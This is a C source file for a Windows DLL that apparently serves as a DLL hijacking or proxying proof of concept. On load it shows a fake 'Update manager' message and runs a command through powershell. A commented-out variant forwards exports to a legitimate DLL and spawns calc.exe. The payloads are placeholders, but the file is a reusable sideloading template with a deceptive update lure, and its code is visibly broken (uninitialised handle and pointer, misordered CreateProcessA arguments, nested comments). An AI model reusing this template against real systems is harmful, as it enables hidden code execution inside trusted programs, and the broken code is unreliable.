#include <windows.h>


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
  
  
        MessageBoxA(NULL, "Update will start shortly ...", "Update manager", 0);
        WinExec("powershell.exe 'whoami.exe'", SW_NORMAL);


        HANDLE hHandle;
        WaitForSingleObject(&hHandle,500000);

      
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


/*

#include <windows.h>


#pragma comment(linker, "/export:exportedFunction1=legit1.exportedFunction1")
#pragma comment(linker, "/export:exportedFunction2=legit1.exportedFunction2")
#pragma comment(linker, "/export:exportedFunction3=legit1.exportedFunction3")

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {


       /* BOOL CreateProcessA(
            [in, optional]      LPCSTR                lpApplicationName,
            [in, out, optional] LPSTR                 lpCommandLine,
            [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
            [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
            [in]                BOOL                  bInheritHandles,
            [in]                DWORD                 dwCreationFlags,
            [in, optional]      LPVOID                lpEnvironment,
            [in, optional]      LPCSTR                lpCurrentDirectory,
            [in]                LPSTARTUPINFOA        lpStartupInfo,
            [out]               LPPROCESS_INFORMATION lpProcessInformation
        );
LPSTARTUPINFOA si;
PROCESS_INFORMATION pi;
ZeroMemory(&si, sizeof(si));
si->cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
MessageBoxA(NULL, "TestDLL", "TestDLL", 0);

CreateProcessA(NULL, (LPSTR)"calc.exe", NULL, NULL, NORMAL_PRIORITY_CLASS, NULL, NULL, NULL, si,&pi);

LPCSTR result = LPCSTR(std::to_string(GetLastError()).c_str());


MessageBoxA(NULL, result, "TestDLL", 0);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

KERNELBASE!CreateProcessInternalA
*/